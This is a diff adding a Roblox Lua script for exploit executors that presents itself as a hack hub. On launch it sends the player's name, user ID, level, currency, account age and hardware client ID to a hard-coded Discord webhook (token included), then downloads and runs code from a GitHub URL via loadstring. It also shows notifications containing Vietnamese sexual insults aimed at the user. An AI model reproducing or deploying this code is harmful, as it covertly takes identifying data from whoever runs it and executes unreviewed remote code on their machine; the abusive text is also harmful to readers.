@@ -1,0 +1,74 @@
+local HttpService = game:GetService("HttpService")
+Webhook_URL =  "https://discord.com/api/webhooks/1260054056626556940/WS-90jwx1wWuXHJUBbF_rjnRlEBHyc0NwhNBsAunNeIp3zdqBbks-UWe8AdJXdjfMn5J"
+local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+httprequest(
+{
+Url = Webhook_URL,
+Method = 'POST',
+Headers = {
+['Content-Type'] = 'application/json'
+},
+Body = HttpService:JSONEncode({
+["content"] = "",
+["embeds"] = {{
+["author"] = {
+["name"] = game.Players.LocalPlayer.Name,
+["icon"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=100&height=100&format=png"
+},
+["title"] = ""..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+["description"] = " ["..game.Players.LocalPlayer.DisplayName.."] thk này vừa dùng hack cko nó bucu đi",
+["type"] = "rich",
+["color"] = tonumber(0xffffff),
+["fields"] = {
+{
+["name"] = "Server Script:",
+["value"] = "```game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId,'"..game.JobId.."',game.Players.LocalPlayer)```",
+["inline"] = true },
+{
+["name"] = "User ID:",
+["value"] = game:GetService("Players").LocalPlayer.UserId,
+["inline"] = true },
+{
+["name"] = "Beli+Level:",
+["value"] = "LV: "..game:GetService("Players").LocalPlayer.Data.Levels.Value.." | Beli: "..game:GetService("Players").LocalPlayer.Data.Belis.Value,
+["inline"] = true },
+{
+["name"] = "Account Age:",
+["value"] = game:GetService("Players").LocalPlayer.AccountAge,
+["inline"] = true },
+{
+["name"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+["value"] = os.date(),
+["inline"] = true }
+}
+}}
+})
+})
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DuyM7/Function-FindFirstChild-Plr/main/blacklist"))()
+local test = game:GetService("Workspace"):FindFirstChild("Testh")
+if test then
+test:Destroy()
+else
+game.StarterGui:SetCore("SendNotification", {
+                 Title = "Ngu", 
+                 Text = " 1 cid | đêm qua t cko mẹ m ngậm cu t",
+                 Icon = Anh_Gai_Alimi[math.random(1,#Anh_Gai_Alimi)], 
+                 Duration = 2
+             })  
+game:GetService("Players").PlayerAdded:Connect(function(Player)
+             game.StarterGui:SetCore("SendNotification", { 
+                 Title = "non", 
+                 Text = "🟢 "..Player.Name.. " Đã Vào Server",
+                 Icon = "https://www.roblox.com/headshot-thumbnail/image?userId="..Player.UserId.."&width=100&height=100&format=png",
+                 Duration = 3
+             }) 
+end)
+game:GetService("Players").PlayerRemoving:Connect(function(Player)
+             game.StarterGui:SetCore("SendNotification", { 
+                 Title = "Test Hub!", 
+                 Text = "🔴 "..Player.Name.." | LV: "..Player.Data.Levels.Value.." Đã Rời Server",
+                 Icon = "https://www.roblox.com/headshot-thumbnail/image?userId="..Player.UserId.."&width=100&height=100&format=png",
+                 Duration = 3
+             }) 
+end)
+end
